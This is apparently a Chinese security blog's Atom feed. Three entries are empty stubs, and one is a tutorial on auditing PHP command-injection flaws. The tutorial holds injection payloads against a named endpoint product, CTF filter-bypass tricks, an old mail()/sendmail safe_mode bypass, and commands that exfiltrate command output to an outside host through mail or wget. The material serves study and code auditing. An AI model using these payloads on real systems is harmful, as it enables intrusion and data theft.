<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>n0tepadの技术笔记</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-10-16T01:46:35.662Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>n0tepad</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows病毒分析三板斧-汇编</title>
    <link href="http://example.com/wiki/Windows_Virus-analysis_Assembly/"/>
    <id>http://example.com/wiki/Windows_Virus-analysis_Assembly/</id>
    <published>2024-10-16T01:39:31.000Z</published>
    <updated>2024-10-16T01:46:35.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/l</summary>
      
    
    
    
    <category term="恶意样本分析（Virus analysi）" scheme="http://example.com/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%EF%BC%88Virus-analysi%EF%BC%89/"/>
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="Virus analysis" scheme="http://example.com/tags/Virus-analysis/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计三板斧-Xss漏洞</title>
    <link href="http://example.com/wiki/PHP-Code_Auditing-Xss_Vulnerability/"/>
    <id>http://example.com/wiki/PHP-Code_Auditing-Xss_Vulnerability/</id>
    <published>2024-10-16T01:38:11.000Z</published>
    <updated>2024-10-16T01:46:41.671Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/l</summary>
      
    
    
    
    <category term="代码审计（Code auditing）" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88Code-auditing%EF%BC%89/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="Code auditing" scheme="http://example.com/tags/Code-auditing/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计三板斧-Sql注入漏洞</title>
    <link href="http://example.com/wiki/PHP-Code_Auditing-Sql_injection_Vulnerability/"/>
    <id>http://example.com/wiki/PHP-Code_Auditing-Sql_injection_Vulnerability/</id>
    <published>2024-10-16T01:36:37.000Z</published>
    <updated>2024-10-16T01:46:38.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/l</summary>
      
    
    
    
    <category term="代码审计（Code auditing）" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88Code-auditing%EF%BC%89/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="Code auditing" scheme="http://example.com/tags/Code-auditing/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计三板斧-命令执行漏洞</title>
    <link href="http://example.com/wiki/PHP-Code_Auditing-Command_Execution_Vulnerability/"/>
    <id>http://example.com/wiki/PHP-Code_Auditing-Command_Execution_Vulnerability/</id>
    <published>2024-10-12T14:26:28.000Z</published>
    <updated>2024-10-16T14:46:17.601Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见的命令执行函数"><a href="#常见的命令执行函数" class="headerlink" title="常见的命令执行函数"></a>常见的命令执行函数</h2><table><thead><tr><th>常见函数</th><th>参考</th></tr></thead><tbody><tr><td>system()</td><td>system()输出并返回最后一行shell结果。参考:<a href="https://www.php.net/manual/zh/function.system.php">https://www.php.net/manual/zh/function.system.php</a></td></tr><tr><td>exec()</td><td>不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。参考:<a href="https://www.php.net/manual/zh/function.exec.php">https://www.php.net/manual/zh/function.exec.php</a></td></tr><tr><td>passthru()</td><td>只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。参考:<a href="https://www.php.net/manual/zh/function.passthru.php">https://www.php.net/manual/zh/function.passthru.php</a></td></tr><tr><td>&#96;&#96;</td><td>参考:<a href="https://www.php.net/manual/zh/language.operators.execution.php">https://www.php.net/manual/zh/language.operators.execution.php</a></td></tr><tr><td>shell_exec()</td><td>参考:<a href="https://www.php.net/manual/zh/function.shell-exec.php">https://www.php.net/manual/zh/function.shell-exec.php</a></td></tr><tr><td>popen()</td><td>不会直接返回执行结果，而是返回一个文件指针。参考:<a href="https://www.php.net/manual/zh/function.popen.php">https://www.php.net/manual/zh/function.popen.php</a></td></tr><tr><td>proc_open()</td><td>不会直接返回执行结果，而是返回一个文件指针。参考:<a href="https://www.php.net/manual/zh/function.proc-open.php">https://www.php.net/manual/zh/function.proc-open.php</a></td></tr><tr><td>pcntl_exec()</td><td>参考:<a href="https://www.php.net/manual/zh/function.pcntl-exec.php">https://www.php.net/manual/zh/function.pcntl-exec.php</a></td></tr><tr><td>mail()</td><td>PHP-4.2.2以下到 PHP-4.0.5版本都存在 PHP mail 函数绕过 safe_mode 限制执行命令漏洞，4.0.5版本开始 mail 函数增加了第五个参数，由于设计者考虑不周可以突破 safe_mode 的</td></tr><tr><td>限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加 shell 命令就可以了</td><td></td></tr></tbody></table><h2 id="常见的命令执行函数-1"><a href="#常见的命令执行函数-1" class="headerlink" title="常见的命令执行函数"></a>常见的命令执行函数</h2><table><thead><tr><th>常见函数</th><th>参考</th></tr></thead><tbody><tr><td>escapeshellarg()</td><td></td></tr><tr><td>escapeshellcmd()</td><td></td></tr></tbody></table><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="1、system"><a href="#1、system" class="headerlink" title="1、system()"></a>1、system()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_1.26lgwy3ig8.webp"></p><h3 id="2、exec"><a href="#2、exec" class="headerlink" title="2、exec()"></a>2、exec()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_2.39l67tzcbs.webp"></p><h3 id="3、passthru"><a href="#3、passthru" class="headerlink" title="3、passthru()"></a>3、passthru()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_3.3k800zekh5.webp"></p><h3 id="4、"><a href="#4、" class="headerlink" title="4、&#96;&#96;"></a>4、&#96;&#96;</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_4.13lrm27okq.webp"></p><h3 id="5、shell-exec"><a href="#5、shell-exec" class="headerlink" title="5、shell_exec()"></a>5、shell_exec()</h3><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_5.2rv4j8xyr0.webp"></p><h3 id="6、popen"><a href="#6、popen" class="headerlink" title="6、popen()"></a>6、popen()</h3><h3 id="7、proc-open"><a href="#7、proc-open" class="headerlink" title="7、proc_open()"></a>7、proc_open()</h3><h3 id="8、pcntl-exec"><a href="#8、pcntl-exec" class="headerlink" title="8、pcntl_exec()"></a>8、pcntl_exec()</h3><h3 id="9、mail"><a href="#9、mail" class="headerlink" title="9、mail()"></a>9、mail()</h3><h4 id="（1）古老的PHP-mail-函数绕过-safe-mode-限制执行命令漏洞"><a href="#（1）古老的PHP-mail-函数绕过-safe-mode-限制执行命令漏洞" class="headerlink" title="（1）古老的PHP mail 函数绕过 safe_mode 限制执行命令漏洞"></a>（1）古老的PHP mail 函数绕过 safe_mode 限制执行命令漏洞</h4><p>这个漏洞应该很古老了，我搭建好了可以发邮件的环境，但是没复现出来，应该是PHP版本的问题。<br>PHP-4.2.2以下到 PHP-4.0.5版本都存在 PHP mail 函数绕过 safe_mode 限制执行命令漏洞，4.0.5版本开始 mail 函数增加了第五个参数，由于设计者考虑不周可以突破 safe_mode 的限制执行命令。其中4.0.5版本突破非常简单，只需用分号隔开后面加 shell 命令就可以了。</p><p><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_7.9dcyaa20q5.webp"></p><? mail("foo@bar,"foo","bar","",$bar);?><p>执行如下的 URL：<br><a href="http://foo.com/evil.php?bar=;/usr/bin/id%7Cmail">http://foo.com/evil.php?bar=;/usr/bin/id|mail</a> <a href="mailto:&#101;&#x76;&#x69;&#x6c;&#x40;&#x64;&#x6f;&#x6d;&#x61;&#105;&#x6e;&#x2e;&#99;&#x6f;&#109;">&#101;&#x76;&#x69;&#x6c;&#x40;&#x64;&#x6f;&#x6d;&#x61;&#105;&#x6e;&#x2e;&#99;&#x6f;&#109;</a><br>这将 id 执行的结果发送给 <a href="mailto:&#101;&#x76;&#105;&#108;&#64;&#100;&#x6f;&#109;&#97;&#x69;&#110;&#x2e;&#x63;&#x6f;&#109;">&#101;&#x76;&#105;&#108;&#64;&#100;&#x6f;&#109;&#97;&#x69;&#110;&#x2e;&#x63;&#x6f;&#109;</a>。<br>对于4.0.6至4.2.2的 PHP 突破 safe_mode 限制其实是利用了 sendmail 的-C参数，所以系统必<br>须是使用 sendmail。如下的代码能够突破 safe_mode 限制执行命令：<br><?PS: 注意，下面这两个必须是不存在的，或者它们的属主和本脚本的属主是一样$script="/tmp/script123";$cf="/tmp/cf123";$fd = fopen($cf, "w");fwrite($fd, "OQ/tmpSparse=0R$*" . chr(9). "$#local $@ $1 $: $1Mlocal, P=/bin/sh,A=sh $script");fclose($fd);$fd = fopen($script, "w");fwrite($fd, "rm -f $script $cf; ");fwrite($fd, $cmd);fclose($fd);mail("nobody", "", "", "", "-C$cf");?><br>参考链接:<a href="https://www.anquanke.com/post/id/86028">https://www.anquanke.com/post/id/86028</a></p><h2 id="命令执行漏洞构造POC的小技巧"><a href="#命令执行漏洞构造POC的小技巧" class="headerlink" title="命令执行漏洞构造POC的小技巧"></a>命令执行漏洞构造POC的小技巧</h2><p>命令注入的方式有两种：<br>第一种是使用命令自带的参数来拼接命令；<br>第二种是通过拼接来截断原命令；<br>这里面都有一些windows或者linux的特性：</p><h3 id="截断命令的方式-（Windows和Linux执行命令的操作方式）"><a href="#截断命令的方式-（Windows和Linux执行命令的操作方式）" class="headerlink" title="截断命令的方式  （Windows和Linux执行命令的操作方式）"></a>截断命令的方式  （Windows和Linux执行命令的操作方式）</h3><p>原则：<br>1.我们要尝试闭合echo语句。那么我们就要用到;符号。<br>2.让;后的内容失效。这里我们就要使用shell下的单行注释符号#。</p><h4 id="Windows管道符"><a href="#Windows管道符" class="headerlink" title="Windows管道符"></a>Windows管道符</h4><table><thead><tr><th>符号</th><th>目的</th></tr></thead><tbody><tr><td>“</td><td>”</td></tr><tr><td>“</td><td></td></tr><tr><td>“&amp;”</td><td>如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</td></tr><tr><td>“&amp;&amp;”</td><td>如果前面的语句为假则直接出错,也不执行后面的语句，前面的语句只能为真。</td></tr><tr><td>%0a</td><td></td></tr><tr><td>%1a</td><td></td></tr></tbody></table><h4 id="Linux管道符"><a href="#Linux管道符" class="headerlink" title="Linux管道符"></a>Linux管道符</h4><table><thead><tr><th>符号</th><th>目的</th></tr></thead><tbody><tr><td>“;”</td><td>执行完前面的语句再执行后面的</td></tr><tr><td>“</td><td>”</td></tr><tr><td>“</td><td></td></tr><tr><td>“&amp;”</td><td>如果当前面的语句为假则直接执行后面的语句，前面的语句可真可假。</td></tr><tr><td>“&amp;&amp;”</td><td>如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真</td></tr><tr><td>%0a</td><td></td></tr><tr><td>%0d</td><td></td></tr></tbody></table><h5 id="例：金山V8-终端安全系统命令执行漏洞"><a href="#例：金山V8-终端安全系统命令执行漏洞" class="headerlink" title="例：金山V8 终端安全系统命令执行漏洞"></a>例：金山V8 终端安全系统命令执行漏洞</h5><p>这漏洞就是用拼接来截断原命令的方式，漏洞点在&#x2F;Console&#x2F;inter&#x2F;pdf_maker.php中<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_8.51e53jlofg.webp"><br>这里面的exec()和system()函数都是经典的命令执行函数，不管走到哪个分支都会执行了$cmd对应的值，$cmd是由$url和$fileName参数拼接的，$url和$fileName都是由$_POST传入的值经过base64解码（拼接后），都是可控的，由于前面的拼接的命令是..\..\wkhtmltopdf.exe 所以不能用参数的方式，直接帮他闭合一下并换成我们要执行的命令whoami，最终变成命令是..\..\wkhtmltopdf.exe “”|| whoami ||”.$fileName 就不用管$fileName参数了，但是不能为空，所以传入的$url为”|| whoami ||的base64编码，$fileName不为空都可以<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_9.2krwomesj1.webp"><br>或者fileName参数也可以，去掉上面需要闭合的双引号后base64加密，最后效果如下：<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_10.58hcyz7tv2.webp"></p><h3 id="利用已经有的命令参数拼接"><a href="#利用已经有的命令参数拼接" class="headerlink" title="利用已经有的命令参数拼接"></a>利用已经有的命令参数拼接</h3><h4 id="例：使用file命令的-f参数造成文件读取漏洞"><a href="#例：使用file命令的-f参数造成文件读取漏洞" class="headerlink" title="例：使用file命令的-f参数造成文件读取漏洞"></a>例：使用file命令的-f参数造成文件读取漏洞</h4><p>-f 参数 将显示在 FILE 列表中指定的每个文件的类型，间接可得到文件内容，可考虑使用file -f filename 来造成任意文件读取漏洞效果<br>有一道CTF题目的例子（参考一个大佬的思路）<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_11.7pa7f0zcf.webp"><br>现在的情况是<br>（1）过滤了常见的命令分隔符（;、&amp;、|）以及命令替换符（$()、&#96;&#96;）<br>（2）输入被引号包裹，得想法闭合引号才行。<br>闭合引号为常用三种手法，<br>一是再次输入引号自然闭合<br>二是用命令注释符（#）让 shell 忽略后面的引号<br>三是用反斜杠（\）将引号转义为普通字符。<br>注：<br>这里面有一个PHP反斜杠匹配的问题<br>在preg_match中要过滤\ 是需要四个\\才可以达到目的,经过两次解析，第一层Php解析器解析成\ ,然后正则匹配解析成,所以只过滤了一个<br>出题人这里大概是想过滤\和\， 但是写法出错了<br>|\| 实际上经过php解析器后成,然后再经过正则解析成| ,所以就成了过滤| ,然后再与后面的|\\| 拼接，|\|\\|实际上过滤的是|<br>还有一个linux绕过黑名单的技巧<br>内部空变量：g$1rep<br>无效转义绕过：g\rep -r<br>通配符绕过：&#x2F;bin&#x2F;gr?p</p><p>综上：这里面就出现了两种方式拿到flag：<br>第一种用-f参数读取flag文件<br>由于引号已经被过滤了，所以先使用反斜杠（\）将引号转义为普通字符，又不用截断的方式，所以使用file -f 参数，最后把最终传入的命令变成file -f .&#x2F;fl?????? &quot; 或者 file -f .&#x2F;fl$1ag.php &quot; ,<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_12.2doot6sn3k.webp"><br>第二种是使用换行符代替命令分割符带入命令<br>由于引号已经被过滤了，所以先使用反斜杠（\）将引号转义为普通字符，又不用截断的方式，使用换行符（%0A），但是后面还要通过#来截断后面的命令，最后传入的命令变成了file “&quot; “%0a&#x2F;bin&#x2F;gr$1ep -r . . # 或者 file “&quot; “%0a&#x2F;bin&#x2F;gr$1ep -r . . %0a<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_13.3k801shjoy.webp"></p><h4 id="例：Wget-也可以使用-O参数"><a href="#例：Wget-也可以使用-O参数" class="headerlink" title="例：Wget 也可以使用-O参数"></a>例：Wget 也可以使用-O参数</h4><h4 id="例：使用curl命令或者wget针对无回显的情况外带数据"><a href="#例：使用curl命令或者wget针对无回显的情况外带数据" class="headerlink" title="例：使用curl命令或者wget针对无回显的情况外带数据"></a>例：使用curl命令或者wget针对无回显的情况外带数据</h4><p>在双引号被转义，&#96;&#96;禁止使用，换行符和命令分割符都不允许使用的前提下，有这样一个代码demo<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_14.4919lt52pf.webp"><br>这里面就使用了wget命令，由于前面一系列的限制条件，所以我们只能考虑在双引号里面用$(command)将命令执行后再通过访问一个公网服务器的日志查看命令执行后的结果。<br>先准备一个apache的服务器，确定access.log文件的位置。<br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_15.41y1qdix9w.webp"><br>确定一下$(command)这种形式可以在双引号下执行成功，但是单引号下不行，所以使用wget “<a href="http://192.168.211.7/$(whoami)%22%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%8A%8A%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E7%9A%84%E7%BB%93%E6%9E%9C%E5%B8%A6%E5%87%BA%E6%9D%A5%E7%9A%84">http://192.168.211.7/$(whoami)&quot;是可以把执行成功的结果带出来的</a><br><img src="https://github.com/n0tepad-pro/picx-images-hosting/raw/master/1_16.1sf16vy6t0.webp"></p><h2 id="命令执行漏洞的一些绕过技巧"><a href="#命令执行漏洞的一些绕过技巧" class="headerlink" title="命令执行漏洞的一些绕过技巧"></a>命令执行漏洞的一些绕过技巧</h2><h3 id="情况1：echo-arg-bc，-右边是一个有错的命令"><a href="#情况1：echo-arg-bc，-右边是一个有错的命令" class="headerlink" title="情况1：echo $arg | bc，|右边是一个有错的命令"></a>情况1：echo $arg | bc，|右边是一个有错的命令</h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href=""></a></li><li><a href=""></a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;常见的命令执行函数&quot;&gt;&lt;a href=&quot;#常见的命令执行函数&quot; class=&quot;headerlink&quot; title=&quot;常见的命令执行函数&quot;&gt;&lt;/a&gt;常见的命令执行函数&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;常见函数&lt;/th&gt;
&lt;th&gt;参考&lt;/th</summary>
      
    
    
    
    <category term="代码审计（Code auditing）" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88Code-auditing%EF%BC%89/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="Code auditing" scheme="http://example.com/tags/Code-auditing/"/>
    
  </entry>
  
</feed>
